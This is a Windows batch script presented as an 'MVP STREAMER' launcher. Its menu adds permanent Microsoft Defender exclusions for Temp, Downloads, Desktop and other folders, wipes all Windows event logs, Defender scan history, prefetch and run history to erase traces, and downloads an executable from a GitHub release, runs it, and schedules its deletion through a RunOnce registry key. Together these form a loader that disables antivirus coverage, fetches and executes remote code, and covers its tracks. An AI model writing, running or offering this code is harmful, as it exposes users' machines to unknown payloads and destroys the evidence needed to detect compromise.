@echo off
title MVP STREAMER
color 0A
cls

:: Set working directory
cd /d "%~dp0"

:: RAW LINKS
set STATUS_URL=https://raw.githubusercontent.com/mirrorGOD7/fuzzy-disco/refs/heads/main/status.txt
set VERSION_URL=https://raw.githubusercontent.com/mirrorGOD7/fuzzy-disco/refs/heads/main/version.txt
set NAME_URL=https://raw.githubusercontent.com/mirrorGOD7/fuzzy-disco/refs/heads/main/name.txt
set BASE_EXE_URL=https://github.com/mirrorGOD7/fuzzy-disco/releases/download/porn/

:: Read contents directly from URL (NO file download)
for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing '%STATUS_URL%').Content.Trim()"') do set STATUS=%%A
for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing '%VERSION_URL%').Content.Trim()"') do set VERSION=%%A
for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing '%NAME_URL%').Content.Trim()"') do set EXENAME=%%A

:menu
cls
echo MVP STREAMER
echo.
echo [1] Defender Bypass
echo [2] Clear Logs
echo [3] Run Streamer
echo [0] Exit
echo.
set /p choice=Enter choice: 

if "%choice%"=="1" goto defender
if "%choice%"=="2" goto clear
if "%choice%"=="3" goto run
if "%choice%"=="0" exit
goto menu

:defender
echo.
echo Checking Defender exclusions...

:: Check if current folder is already excluded
powershell -Command "if ((Get-MpPreference).ExclusionPath -contains '%cd%') { exit 0 } else { exit 1 }"
if %errorlevel%==0 (
    echo.
    echo Defender Already Bypassed!
    pause
    goto menu
)

echo.
echo Applying Defender Bypass...

:: Exclude important folders permanently
powershell -Command "Add-MpPreference -ExclusionPath '%temp%'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"
powershell -Command "Add-MpPreference -ExclusionPath '%SystemRoot%\Prefetch'"
powershell -Command "Add-MpPreference -ExclusionPath '%UserProfile%\Desktop'"
powershell -Command "Add-MpPreference -ExclusionPath '%UserProfile%\Downloads'"
powershell -Command "Add-MpPreference -ExclusionPath '%cd%'"

echo.
echo Defender bypass applied successfully (Permanent)!
pause
goto menu

:clear
echo.
echo Clearing logs and traces...

:: Clear current user's TEMP folder
del /f /s /q "%temp%\*" >nul 2>&1
for /d %%x in ("%temp%\*") do rd /s /q "%%x" >nul 2>&1

:: Clear system TEMP folder
del /f /s /q "C:\Windows\Temp\*" >nul 2>&1
for /d %%x in ("C:\Windows\Temp\*") do rd /s /q "%%x" >nul 2>&1

:: Clear prefetch
del /f /s /q "%SystemRoot%\Prefetch\*" >nul 2>&1

:: Clear Windows Defender logs
takeown /f "C:\ProgramData\Microsoft\Windows Defender\Scans\History" /r /d y >nul 2>&1
icacls "C:\ProgramData\Microsoft\Windows Defender\Scans\History" /grant administrators:F /t >nul 2>&1
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" >nul 2>&1
del /f /q "C:\ProgramData\Microsoft\Windows Defender\Support\*.log" >nul 2>&1

:: Clear event logs
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" >nul 2>&1

:: Clear recent files
del /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1

:: Clear registry run history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1

:: Clear Windows Error Reporting logs
del /f /q "C:\ProgramData\Microsoft\Windows\WER\*" >nul 2>&1

echo.
echo Logs cleared successfully.
pause
goto menu

:run
if /i "%STATUS%"=="streamer under maintenance" (
    echo.
    echo Streamer is under maintenance. Please wait for update.
    pause
    goto menu
)

if /i "%STATUS%"=="up to date" (
    echo.
    echo Streamer Updated.
    echo Running Streamer (Version: %VERSION%)
    echo.
    curl -L -o "%EXENAME%" "%BASE_EXE_URL%%EXENAME%"
    start "" "%EXENAME%"

    :: Schedule deletion on reboot
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "DeleteStreamer" /t REG_SZ /d "cmd /c del /f /q \"%~dp0%EXENAME%\"" /f >nul 2>&1

    timeout /t 2 >nul
    goto menu
)

goto menu
